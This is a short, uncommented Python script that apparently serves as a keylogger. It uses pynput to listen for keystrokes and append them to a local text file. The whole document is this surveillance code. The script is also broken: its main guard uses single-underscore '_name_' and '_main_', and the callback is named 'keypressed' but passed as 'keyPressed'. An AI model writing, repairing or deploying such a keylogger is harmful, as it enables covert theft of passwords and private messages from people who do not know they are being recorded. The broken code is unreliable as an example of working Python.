from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.text", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error getting char")

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
